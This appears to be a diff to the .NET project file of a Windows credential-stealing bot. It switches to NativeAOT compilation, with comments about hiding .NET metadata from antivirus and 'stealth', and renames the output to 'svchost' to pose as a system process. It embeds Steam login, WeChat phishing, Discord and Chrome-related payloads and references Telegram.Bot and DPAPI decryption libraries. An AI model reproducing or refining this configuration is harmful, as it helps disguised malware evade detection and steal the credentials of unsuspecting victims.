@@ -6,39 +6,46 @@
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
 
-    <!-- Single-file publish (hides MSIL structure, removes .NET metadata visible to AV) -->
-    <PublishSingleFile>true</PublishSingleFile>
+    <!-- NativeAOT: compiles to native code (no MSIL, no .NET metadata) -> ~15MB -->
+    <PublishAot>true</PublishAot>
     <SelfContained>true</SelfContained>
     <RuntimeIdentifier>win-x64</RuntimeIdentifier>
-    <IncludeNativeLibrariesForSelfExtract>true</IncludeNativeLibrariesForSelfExtract>
+    <IlcOptimizationPreference>Size</IlcOptimizationPreference>
+    
+    <!-- Reflection is REQUIRED for Telegram.Bot and Newtonsoft.Json -->
+    <IlcDisableReflection>false</IlcDisableReflection>
+    <IlcGenerateStackTraceData>true</IlcGenerateStackTraceData>
+    <TrimMode>partial</TrimMode>
 
-    <!-- Minimize binary footprint and remove debug info -->
-    <OptimizationPreference>Speed</OptimizationPreference>
+    <!-- Size reduction & stealth -->
     <DebugType>None</DebugType>
     <DebugSymbols>false</DebugSymbols>
     <Deterministic>false</Deterministic>
-
-    <UseWindowsForms>true</UseWindowsForms>
     <InvariantGlobalization>true</InvariantGlobalization>
-    <AssemblyName>FinalBot</AssemblyName>
+    <AssemblyName>svchost</AssemblyName>
     <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
-
-    <!-- Note: PublishAot=true is incompatible with Windows Forms (Drawing/screenshot module).
-         Use the publish.ps1 script to build with a randomised output filename. -->
+    
+    <!-- WinForms dependency completely removed for NativeAOT support -->
   </PropertyGroup>
 
   <ItemGroup>
-    <EmbeddedResource Include="SteamAlert.exe" />
-    <EmbeddedResource Include="SteamLogin.exe" />
+    <RdXmlFile Include="rd.xml" />
+    <TrimmerRootAssembly Include="Newtonsoft.Json" />
+    <TrimmerRootAssembly Include="Telegram.Bot" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <EmbeddedResource Include="SteamAlert.bin" />
+    <EmbeddedResource Include="SteamLogin.bin" />
+    <EmbeddedResource Include="chromelevator.bin" />
     <EmbeddedResource Include="core\wechat_phish.py" />
     <EmbeddedResource Include="websocket\discord_bot.py" />
   </ItemGroup>
+  
   <ItemGroup>
     <!-- Dependencies -->
     <PackageReference Include="Microsoft.Data.Sqlite" Version="8.0.0" />
     <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />
-    <PackageReference Include="System.Management" Version="8.0.0" />
-    <PackageReference Include="System.Drawing.Common" Version="8.0.0" />
     <PackageReference Include="System.Security.Cryptography.ProtectedData" Version="8.0.0" />
     <PackageReference Include="Telegram.Bot" Version="19.0.0" />
   </ItemGroup>
